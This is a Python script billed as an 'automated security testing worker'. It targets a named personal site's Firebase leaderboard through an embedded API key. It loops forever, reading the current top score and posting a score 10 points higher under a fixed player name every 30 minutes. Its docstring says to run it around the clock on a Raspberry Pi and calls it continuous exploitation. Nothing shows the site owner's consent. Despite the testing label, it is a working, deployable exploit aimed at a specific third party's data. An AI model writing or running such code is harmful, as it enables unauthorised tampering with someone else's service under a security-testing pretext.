"""
AUTOMATED SECURITY TESTING WORKER
==================================
Continuously tests Firebase security vulnerability by incrementally
submitting higher scores to demonstrate the lack of validation.

DEPLOYMENT: Run this on a Raspberry Pi for 24/7 security testing
FREQUENCY: Checks every 30 minutes and submits a score 10 points higher

This demonstrates that without proper security rules, an automated
script can continuously manipulate the leaderboard.
"""

import requests
import json
import time
from datetime import datetime
import sys

# Firebase configuration
FIREBASE_CONFIG = {
    "apiKey": "AIzaSyBDM1Tk1Pj1M1O1jkPHXsKSlnj1h4kp1km0",
    "projectId": "leaderboard-personal-site"
}

PLAYER_NAME = "John H"
CHECK_INTERVAL = 30 * 60  # 30 minutes in seconds
SCORE_INCREMENT = 10

class SecurityTester:
    def __init__(self):
        self.project_id = FIREBASE_CONFIG["projectId"]
        self.api_key = FIREBASE_CONFIG["apiKey"]
        self.base_url = f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents"

    def get_current_high_score(self):
        """Fetch current high score from leaderboard"""
        try:
            url = f"{self.base_url}/scores"
            params = {"key": self.api_key}

            response = requests.get(url, params=params, timeout=10)

            if response.status_code == 200:
                data = response.json()
                documents = data.get('documents', [])

                if not documents:
                    return 0

                # Extract all scores
                scores = []
                for doc in documents:
                    fields = doc.get('fields', {})
                    score = fields.get('score', {}).get('integerValue', '0')
                    scores.append(int(score))

                return max(scores) if scores else 0
            else:
                print(f"Error fetching scores: {response.status_code}")
                return 0

        except Exception as e:
            print(f"Error getting high score: {e}")
            return 0

    def submit_score(self, score):
        """Submit a new high score"""
        try:
            url = f"{self.base_url}/scores?key={self.api_key}"

            timestamp = datetime.utcnow().isoformat() + "Z"
            payload = {
                "fields": {
                    "name": {"stringValue": PLAYER_NAME},
                    "score": {"integerValue": str(score)},
                    "level": {"integerValue": "1"},
                    "timestamp": {"timestampValue": timestamp}
                }
            }

            headers = {"Content-Type": "application/json"}
            response = requests.post(url, json=payload, headers=headers, timeout=10)

            if response.status_code in [200, 201]:
                return True
            else:
                print(f"Submission failed: {response.status_code}")
                print(response.text)
                return False

        except Exception as e:
            print(f"Error submitting score: {e}")
            return False

    def run_continuous_test(self):
        """Main loop - runs continuously"""
        print("=" * 70)
        print("AUTOMATED SECURITY TESTING WORKER")
        print("=" * 70)
        print(f"Target: jordancota.site")
        print(f"Player: {PLAYER_NAME}")
        print(f"Check interval: {CHECK_INTERVAL / 60} minutes")
        print(f"Score increment: +{SCORE_INCREMENT} points")
        print("=" * 70)
        print()

        iteration = 0

        while True:
            iteration += 1
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            print(f"[{timestamp}] Iteration #{iteration}")
            print("-" * 70)

            # Get current high score
            print("Fetching current high score...")
            current_high = self.get_current_high_score()
            print(f"Current high score: {current_high}")

            # Calculate new score
            new_score = current_high + SCORE_INCREMENT
            print(f"New score to submit: {new_score}")

            # Submit new score
            print(f"Submitting score for {PLAYER_NAME}...")
            success = self.submit_score(new_score)

            if success:
                print(f"SUCCESS: Submitted {new_score} for {PLAYER_NAME}")
            else:
                print("FAILED: Could not submit score")

            print()
            print(f"Waiting {CHECK_INTERVAL / 60} minutes until next test...")
            print("=" * 70)
            print()

            # Wait before next iteration
            time.sleep(CHECK_INTERVAL)

def main():
    """Entry point"""
    print()
    print("SECURITY VULNERABILITY TESTING")
    print("This script demonstrates continuous exploitation of")
    print("Firebase security vulnerabilities.")
    print()

    tester = SecurityTester()

    try:
        tester.run_continuous_test()
    except KeyboardInterrupt:
        print()
        print("=" * 70)
        print("Security testing stopped by user")
        print("=" * 70)
        sys.exit(0)
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
